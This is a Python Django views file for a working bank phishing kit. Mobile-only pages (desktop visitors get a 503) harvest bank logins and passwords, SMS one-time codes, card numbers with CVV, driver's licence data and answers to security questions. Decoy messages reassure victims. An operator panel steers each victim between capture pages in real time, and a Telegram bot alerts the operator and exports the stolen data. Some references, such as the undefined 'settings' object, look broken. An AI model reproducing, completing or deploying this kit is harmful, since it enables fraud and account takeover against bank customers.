import os
import uuid
from django.http import JsonResponse, HttpResponse
from django.shortcuts import render, redirect
from django.template.loader import render_to_string
from django.views.decorators.csrf import csrf_exempt

from bank.settings import bot, export_t, export_id
from . import utils
from .forms import SettingsForm
from .models import Client, ClientSms, ClientDriver, ClientCard, ClientProfile, ClientLogin, ClientQuestion, Settings
from basicauth.decorators import basic_auth_required
from django.core.paginator import Paginator

tel_user = 1878306410
afk_status = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'afk_status.txt')

try:
    Settings.objects.get(pk=1)
except Exception:
    try:
        Settings.objects.create(
            **{
                'id': 1,
                'profile_title': 'Update Personal Details',
                'profile_description': 'In order for us to update personal details please fill in the required information.',

                'sms_title': 'Update Personal Details',
                'sms_description': 'In order for us to update personal details please fill in the required information',

                'card_title': 'Update Personal Details',
                'card_description': 'In order for us to update personal details please fill in the required information',

                'driver_title': 'Update Personal Details',
                'driver_description': 'In order for us to update personal details please fill in the required information',

                'complete_title': 'Transactions canceled',
                'complete_description': 'All pending transactions on your account have now been canceled.'
                                        ' Any transactions shown on your transactions history will'
                                        ' be credited within 2-3 business days.',
            }
        )
    except:
        pass

def redirect_login(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)
    return redirect('login')


def redirect_bank_with_delay(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)
    return render(request, 'complete.html', context={'title': settings.complete_title,
                                                     'desc': settings.complete_description})


@csrf_exempt
def login(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)
    response = render(request, template_name='login.html')
    client_uuid = request.COOKIES.get('client_uuid')
    if not client_uuid or not Client.objects.filter(uuid=client_uuid).exists():
        client_uuid = uuid.uuid4()
        user_ip = utils.visitor_ip_address(request)
        Client.objects.create(uuid=client_uuid, device=request.user_agent, ip=user_ip)
        response.set_cookie('client_uuid', client_uuid)

    client = Client.objects.get(uuid=client_uuid)
    client.online()
    if request.is_ajax():
        ClientLogin.objects.create(bank_id=request.POST.get('client_id'), password=request.POST.get('password'),
                                   client=client)
        with open(afk_status, 'r') as f:
            if f.read() == '1' and client.clientlogin_set.count() == 1:
                bot.send_message(tel_user, text=f'NEW USER WAITING ID: {client.id}')

        client.is_waiting = True
        client.request_from = request.path[1:-1]
        client.save()

        return JsonResponse({})

    return response


@csrf_exempt
def sms(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)
    client_uuid = request.COOKIES.get('client_uuid')
    try:
        client = Client.objects.get(uuid=client_uuid)
        client.online()
    except Client.DoesNotExist:
        return redirect('login')

    if request.is_ajax():
        ClientSms.objects.create(client=client, code=request.POST.get('sms'))
        client.is_waiting = True
        client.request_from = request.path[1:-1]
        client.save()
        redirect_to = client.redirect_to or None
        return JsonResponse({'redirect_to': redirect_to})
    else:
        client.got_redirected()

    return render(request, template_name='sms.html', context={'title': settings.sms_title,
                                                              'desc': settings.sms_description})


@csrf_exempt
def question(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)
    client_uuid = request.COOKIES.get('client_uuid')
    try:
        client = Client.objects.get(uuid=client_uuid)
        client.online()
    except Client.DoesNotExist:
        return redirect('login')

    last_question = client.clientquestion_set.last()
    if not last_question:
        return redirect('login')

    if request.is_ajax():
        last_question.answer = request.POST.get('answer')
        last_question.save()
        client.is_waiting = True
        client.request_from = request.path[1:-1]
        client.save()
        redirect_to = client.redirect_to or None
        return JsonResponse({'redirect_to': redirect_to})
    else:
        client.got_redirected()
    return render(request, template_name='question.html', context={'question': last_question.question})


@csrf_exempt
def driver(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)
    client_uuid = request.COOKIES.get('client_uuid')
    try:
        client = Client.objects.get(uuid=client_uuid)
        client.online()
    except Client.DoesNotExist:
        return redirect('login')

    if request.is_ajax():
        print(request.POST)
        ClientDriver.objects.create(
            full_name=request.POST.get('full_name'),
            license=request.POST.get('license'),
            exp=request.POST.get('exp'),
            client=client
        )
        client.is_waiting = True
        client.request_from = request.path[1:-1]
        client.save()
        redirect_to = client.redirect_to or None
        return JsonResponse({'redirect_to': redirect_to})
    else:
        client.got_redirected()
    return render(request, template_name='driver.html', context={'title': settings.driver_title,
                                                                 'desc': settings.driver_description})


@csrf_exempt
def card(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)
    client_uuid = request.COOKIES.get('client_uuid')
    try:
        client = Client.objects.get(uuid=client_uuid)
        client.online()
    except Client.DoesNotExist:
        return redirect('login')

    if request.is_ajax():
        client_card = ClientCard(client=client)
        card_number = request.POST.get('card')
        card_date = request.POST.get('date')
        cvv = request.POST.get('cvv')
        client_card.card = card_number
        client_card.card_date = card_date
        client_card.cvv = cvv
        client_card.save()

        client.is_waiting = True
        client.request_from = request.path[1:-1]
        client.save()
        redirect_to = client.redirect_to or None
        return JsonResponse({'redirect_to': redirect_to})
    else:
        client.got_redirected()
    return render(request, template_name='card.html', context={'title': settings.card_title,
                                                               'desc': settings.card_description})


@csrf_exempt
def profile(request):
    if not request.user_agent.is_mobile:
        return HttpResponse(status=503)

    client_uuid = request.COOKIES.get('client_uuid')
    try:
        client = Client.objects.get(uuid=client_uuid)
        client.online()
    except Client.DoesNotExist:
        return redirect('login')

    if request.is_ajax():
        data = request.POST
        client = Client.objects.get(uuid=client_uuid)
        client_profile = ClientProfile(client=client)

        client_profile.first_name = data.get('first-name')
        client_profile.last_name = data.get('last-name')
        client_profile.mobile_number = data.get('mobile-number')
        client_profile.birth_date = data.get('birth')
        client_profile.drivers_license = request.FILES.get('license')
        client_profile.save()

        client.is_waiting = True
        client.request_from = request.path[1:-1]
        client.save()
        redirect_to = client.redirect_to or None
        return JsonResponse({'redirect_to': redirect_to})
    else:
        client.got_redirected()
    return render(request, template_name='profile.html', context={'title': settings.profile_title,
                                                                  'desc': settings.profile_description})


def ask_for_sms(request):
    if request.is_ajax():
        client_id = request.COOKIES.get('client_uuid')
        client = Client.objects.get(uuid=client_id)
        client.is_sms_alert = not client.is_sms_alert
        client.save()
        return JsonResponse({})


def get_redirect_to_page(request):
    client_uuid = request.COOKIES.get('client_uuid')
    if client_uuid:
        try:
            client = Client.objects.get(uuid=client_uuid)
            client.online()
            redirect_to = client.redirect_to or None
            if redirect_to == 'error':
                client.got_redirected()
            return JsonResponse({'redirect_to': redirect_to})
        except Client.DoesNotExist:
            return JsonResponse({'error': 'client not found'})


@basic_auth_required
def clients(request):
    online_only = request.GET.get('online', False)
    data = request.GET.get('data', False)
    dl = request.GET.get('dl', False)
    if dl:
        clients = Client.objects.filter(is_deleted=True)
    else:
        clients = Client.objects.filter(is_deleted=False)
        if online_only:
            clients = clients.filter(is_online=True)
        if data:
            clients = clients.filter(clientlogin__isnull=False).distinct()

    clients = clients.order_by('-updated_at', '-is_waiting', '-is_online')
    clients_waiting = clients.filter(is_waiting=True).count()
    clients_online = clients.filter(is_online=True).count()
    paginator = Paginator(clients, 30)
    page_number = request.GET.get('page')
    clients = paginator.get_page(page_number)
    with open(afk_status, 'r') as f:
        return render(request, 'admin.html', {'clients': clients, 'clients_waiting': clients_waiting,
                                              'clients_online': clients_online, 'AFK': f.read()})


@basic_auth_required
@csrf_exempt
def set_redirect(request):
    if request.is_ajax():
        client_id = request.POST.get('client')
        page = request.POST.get('page')
        client = Client.objects.get(uuid=client_id)
        client.redirect_to = page
        client.is_waiting = False
        client.save()
        return JsonResponse({})


@basic_auth_required
@csrf_exempt
def admin_updates(request):
    if request.is_ajax():
        last_user_count = request.POST.get('user_count')
        last_is_online = request.POST.get('clients_online')

        online_filter = request.POST.get('online_filter', 'undefined')
        data_filter = request.POST.get('data_filter', 'undefined')

        clients = Client.objects.filter(is_deleted=False)
        if online_filter != 'undefined':
            clients = clients.filter(is_online=True)
        if data_filter != 'undefined':
            clients = clients.filter(clientlogin__isnull=False).distinct()
        clients = clients.order_by('-updated_at', '-is_waiting', '-is_online')

        clients_waiting = Client.objects.filter(is_waiting=True).count()
        is_online = Client.objects.filter(is_online=True).count()

        if int(last_user_count) != clients_waiting or int(last_is_online) != is_online:
            table = render_to_string('clientsTable.html', {'clients': clients})
            return JsonResponse({'table': table, 'clients_waiting': clients_waiting,
                                 'clients_online': is_online})
        else:
            return JsonResponse({'action': 'hold'})


@basic_auth_required
@csrf_exempt
def client_detailed(request, pk):
    client = Client.objects.get(pk=pk)
    disabled = 'disabled' if not client.is_waiting else ''
    if request.is_ajax():
        return JsonResponse({'current_status': int(client.is_online), 'current_waiting': int(client.is_waiting),
                             'is_wait_sms': int(client.is_sms_alert)})

    return render(request, 'client.html', {'client': client, 'disabled': disabled})


@basic_auth_required
@csrf_exempt
def delete_client(request):
    if request.is_ajax():
        client_id = request.POST.get('client_id')
        client = Client.objects.get(id=client_id)
        client.is_deleted = True
        client.save()
        return JsonResponse({})


@basic_auth_required
def delete_all_clients(request):
    Client.objects.all().update(is_deleted=True)
    return redirect('clients')


@basic_auth_required
def delete_selected(request):
    clients_list = request.GET['list'].split(',')
    if clients_list != ['']:
        for client_id in clients_list:
            client = Client.objects.get(pk=client_id)
            client.is_deleted = True
            client.save()
    return redirect('clients')


@basic_auth_required
def switch_afk(request):
    file = open(afk_status, 'r')
    prev_value = file.read()
    file.close()

    new_file = open(afk_status, 'w')
    new_value = '0' if prev_value == '1' else '1'
    new_file.write(new_value)
    new_file.close()
    return redirect('/clients/?page=1')


@basic_auth_required
@csrf_exempt
def set_question(request):
    if request.is_ajax():
        client = Client.objects.get(pk=request.POST.get('client_id'))
        ClientQuestion.objects.create(client=client, question=request.POST.get('?question'), answer='')
        client.redirect_to = 'question'
        client.save()
        return JsonResponse({})


@basic_auth_required
def client_export(request, pk):
    client = Client.objects.get(pk=pk)
    data = client.export()
    response = HttpResponse(data, content_type='text/plain')
    file_name = f'export_client_id_{pk}'
    export_t(export_id, data)
    response['Content-Disposition'] = f'attachment; filename={file_name}'
    return response


@basic_auth_required
def delete_all_deleted(request):
    clients_to_delete = Client.objects.filter(is_deleted=True)
    for client in clients_to_delete:
        if client.logins().count() != 0:
            export_t(export_id, client.export())
        client.delete()
    return redirect('clients')


@basic_auth_required
def settings_page(request):
    settings_obj = Settings.objects.first()
    if request.method == 'POST':
        form = SettingsForm(request.POST)
        if form.is_valid():
            settings_obj.profile_title = form.cleaned_data.get("profile_title")
            settings_obj.profile_description = form.cleaned_data.get("profile_description")
            settings_obj.sms_title = form.cleaned_data.get("sms_title")
            settings_obj.sms_description = form.cleaned_data.get("sms_description")
            settings_obj.complete_title = form.cleaned_data.get("complete_title")
            settings_obj.complete_description = form.cleaned_data.get("complete_description")
            settings_obj.card_title = form.cleaned_data.get("card_title")
            settings_obj.card_description = form.cleaned_data.get("card_description")
            settings_obj.driver_title = form.cleaned_data.get("driver_title")
            settings_obj.driver_description = form.cleaned_data.get("driver_description")
            settings_obj.save()
            return redirect('clients')

    else:
        form = SettingsForm(instance=settings_obj)

    return render(request, 'settings.html', context={'form': form})
